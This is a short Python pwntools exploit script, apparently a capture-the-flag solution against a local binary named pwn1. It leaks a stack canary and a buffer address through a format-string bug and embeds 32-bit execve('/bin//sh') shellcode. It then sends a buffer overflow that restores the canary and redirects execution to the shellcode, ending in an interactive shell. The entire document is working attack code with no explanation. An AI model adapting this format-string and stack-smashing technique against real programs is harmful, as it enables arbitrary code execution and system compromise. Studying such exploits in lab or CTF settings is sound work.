#!/usr/bin/python 
from pwn import *
# context.log_level = 'debug'
p = process('./pwn1')

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"

p.recvuntil('name:')
# gdb.attach(p, "b *0x80485BC")

fmt = '%31$08x.%36$08x.' + shellcode
p.sendline(fmt)
p.recvuntil('ctf!\n')
canary = int(p.recv(9)[:-1], 16)
buf_start = int(p.recv(9)[:-1], 16) + 16
log.success('canary = ' + hex(canary))
log.success('shellcode start at ' + hex(buf_start))
p.recvuntil('messages:')

payload = (
        "A" * 100,
        p32(canary),
        p32(0)*3,
        p32(buf_start)
        )
payload = ''.join(payload)
p.sendline(payload)

p.interactive()
